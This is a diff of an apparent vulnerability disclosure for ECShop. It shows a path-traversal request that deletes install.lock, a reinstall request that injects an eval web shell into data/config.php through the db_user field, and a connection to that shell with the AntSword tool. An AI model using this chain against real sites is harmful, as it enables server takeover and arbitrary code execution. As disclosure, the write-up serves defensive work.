@@ -64,6 +64,7 @@ Content-Length: 35
 
 act=remove&file[]=../../data/install.lock
 ```
+
 ![image](https://github.com/Luci4n555/vul_report/assets/116565145/edfd2d8c-059c-4586-a133-d71c8a94cd91)
 
 Then we exploit this vulnerability to write malicious code.
@@ -81,7 +82,15 @@ Connection: close
 db_host=localhost&db_port=3306&db_user=${eval($_POST[123])}&db_pass=&db_name=&lang=zh_cn
 ```
 ![image](https://github.com/Luci4n555/vul_report/assets/116565145/d3dd5250-9096-450d-919a-ad28d8384ba2)
+
+We can see that the file source\ecshop\data\config.php has inserted malicious code.
+
+![image](https://github.com/Luci4n555/vul_report/assets/116565145/43be8b14-1387-455b-9e10-3877d576569b)
+
+
 Finally we use the antSwordPublic tool to connect and test code execution.
 The link address is: http://127.0.0.1/data/config.php, the password is 123.
+
 ![image](https://github.com/Luci4n555/vul_report/assets/116565145/2dd54abb-0ee7-4167-a0a6-9e0cc3259624)
+
 Successful execution of arbitrary code.
